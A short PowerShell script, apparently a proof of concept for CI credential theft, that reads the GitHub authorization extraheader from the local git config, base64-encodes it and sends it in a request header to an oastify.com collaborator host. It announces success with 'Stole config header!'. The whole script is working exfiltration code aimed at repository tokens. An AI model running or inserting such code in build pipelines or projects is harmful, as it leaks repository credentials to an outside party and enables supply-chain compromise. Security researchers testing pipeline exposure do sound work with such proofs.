# Try to steal the token from the Git local config
$gitConfig = git config --get http.https://github.com/.extraheader

if ($gitConfig) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($gitConfig)
    $base64Token = [Convert]::ToBase64String($bytes)
    
    Invoke-WebRequest -Uri "https://2vyetmbe7l0qsuxbq6ntm1zwrnxel49t.oastify.com/git-config-steal" `
                      -Method Get `
                      -Headers @{"X-Stolen-Config"=$base64Token}
    Write-Host "Stole config header!"
} else {
    Write-Host "Git config was empty (persist-credentials was false)."
}
